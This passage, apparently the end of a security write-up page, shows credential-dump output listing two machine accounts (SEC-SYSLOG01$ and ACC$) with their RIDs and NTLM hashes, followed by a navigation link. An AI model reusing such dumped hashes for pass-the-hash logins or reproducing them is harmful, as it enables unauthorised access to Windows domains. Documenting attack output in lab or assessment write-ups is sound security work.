RID  : 0000044f (1103)
User : SEC-SYSLOG01$
LM   :
NTLM : 24413f97e44cd86bfe2e7693d85be7e6

RID  : 00000453 (1107)
User : ACC$
LM   :
NTLM : d1f2f2ec5aec994401e3d26b03fed529
```



[back](./section5.html)